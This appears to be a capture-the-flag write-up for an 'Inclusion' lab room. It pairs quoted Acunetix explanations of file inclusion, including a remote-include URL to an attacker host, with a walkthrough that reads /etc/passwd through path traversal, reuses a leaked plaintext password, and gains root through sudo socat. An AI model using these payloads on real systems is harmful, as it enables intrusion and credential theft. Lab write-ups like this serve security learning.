# LFI

## Enumeration

### nmap

```
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e6:3a:2e:37:2b:35:fb:47:ca:90:30:d2:14:1c:6c:50 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDH1X4Cqbxb5okQZBN3LvsIM8dYZOxeMWlReUkWWp+ICQ+6RjVs+bSbShCPac1Zc+lbnfHte1ZRtMW8a3OodW02+8PXcDbZlmMNMWUQmM76D2NZz28PDC7vouYqSQGt6J6gfsTq2YqCMVPU28uoJ/Qvg5C6hM3oFFDztV2BN7Pj+SgZ8a5htxv5wgn/PtWju2CJCQzPhLUrkAlrSb97/YQcvtjwXUGzKGHo62Cl6GINLm3nAVqJnNpm7aWcKowdfnEsrp+S41W5xV1gl4CyvE9usk5LfQwlPDF50FCgzsidA7mn4NbTukdTsNMAOTe0oAmjXAE0q/KCT076stYjRphX
|   256 73:1d:17:93:80:31:4f:8a:d5:71:cb:ba:70:63:38:04 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPvYRKovqOIYhJN1NV8r3T3YTa4N40XFZaWSQjuYyZIsuL6D8Xn9C4v925gPkS/wZyYBh7CRt6CcSbd2ekPByzo=
|   256 d3:52:31:e8:78:1b:a6:84:db:9b:23:86:f0:1f:31:2a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAd782HHJj9kHBKUMOUOgfWVBU9LdeGrlTDQ+Z0hD8yI
80/tcp open  http    syn-ack Werkzeug httpd 0.16.0 (Python 3.6.9)
|_http-title: My blog
| http-methods:
|_  Supported Methods: GET HEAD OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Website and ssh that's a minimmum

we already know the vulnerability so the thing is to exploit it

```
Using Remote File Inclusion (RFI), an attacker can cause the web application to include a remote file. This is possible for web applications that dynamically include external files or scripts. Potential consequences of a successful RFI attack range from sensitive information disclosure and Cross-site Scripting (XSS) to Remote Code Execution. Remote File Inclusion attacks usually occur when an application receives a path to a file as input and does not properly sanitize it. This allows an external URL to be supplied to the include function. The following is an example of PHP code with a Remote File Inclusion vulnerability. /** _ Get the filename from a GET input _ Example - http://example.com/?file=index.php \*/ $file = $\_GET['file']; /** _ Unsafely include the file _ Example - index.php \*/ include($file); Using the above PHP script, an attacker could make the following HTTP request to trick the application into executing server-side malicious code, for example, a webshell. http://example.com/?file=http://attacker.example.com/evil.php In this example, the malicious file is included and run with the privileges of the user who runs the web application. That allows an attacker to run any code they want on the web server. They can even gain a persistent presence on the web server. --> taken from https://www.acunetix.com/blog/articles/remote-file-inclusion-rfi/
```

```
An attacker can use Local File Inclusion (LFI) to trick the web application into exposing or running files on the web server. An LFI attack may lead to information disclosure, remote code execution, or even Cross-site Scripting (XSS). Typically, LFI occurs when an application uses the path to a file as input. If the application treats this input as trusted, a local file may be used in the include statement. Local File Inclusion is very similar to Remote File Inclusion (RFI). However, an attacker using LFI may only include local files (not remote files like in the case of RFI). The following is an example of PHP code that is vulnerable to LFI. /** _ Get the filename from a GET input _ Example - http://example.com/?file=filename.php \*/ $file = $\_GET['file']; /** _ Unsafely include the file _ Example - filename.php \*/ include('directory/' . $file); In the above example, an attacker could make the following request. It tricks the application into executing a PHP script such as a web shell that the attacker managed to upload to the web server. http://example.com/?file=../../uploads/evil.php In this example, the file uploaded by the attacker will be included and executed by the user that runs the web application. That would allow an attacker to run any server-side malicious code that they want. This is a worst-case scenario. An attacker does not always have the ability to upload a malicious file to the application. Even if they did, there is no guarantee that the application will save the file on the same server where the LFI vulnerability exists. Even then, the attacker would still need to know the disk path to the uploaded file. Directory Traversal Even without the ability to upload and execute code, a Local File Inclusion vulnerability can be dangerous. An attacker can still perform a Directory Traversal / Path Traversal attack using an LFI vulnerability as follows. http://example.com/?file=../../../../etc/passwd In the above example, an attacker can get the contents of the /etc/passwd file that contains a list of users on the server. Similarly, an attacker may leverage the Directory Traversal vulnerability to access log files (for example, Apache access.log or error.log), source code, and other sensitive information. This information may then be used to advance an attack. --> taken from https://www.acunetix.com/blog/articles/local-file-inclusion-lfi/

```

The room could not be more straightforward

The vulnerable parameter is `name`

`http://10.10.84.243/article?name=...`

```
http://10.10.84.243/article?name=../../../../../../../etc/passwd

root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin \_apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false falconfeast:x:1000:1000:falconfeast,,,:/home/falconfeast:/bin/bash #falconfeast:rootpassword sshd:x:110:65534::/run/sshd:/usr/sbin/nologin mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false

```

`falconfeast:rootpassword`

Quick access

`falconfeast@inclusion:~$ cat user.txt`

Quick user flag

## Privilege Escalation

`

```
falconfeast@inclusion:~$ sudo -l
Matching Defaults entries for falconfeast on inclusion:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User falconfeast may run the following commands on inclusion:
(root) NOPASSWD: /usr/bin/socat

```

Gtfobins is the real mvp

```
falconfeast@inclusion:~$ sudo socat stdin exec:/bin/sh
id
uid=0(root) gid=0(root) groups=0(root)

cat root.txt
```

And we get out of the nice room!
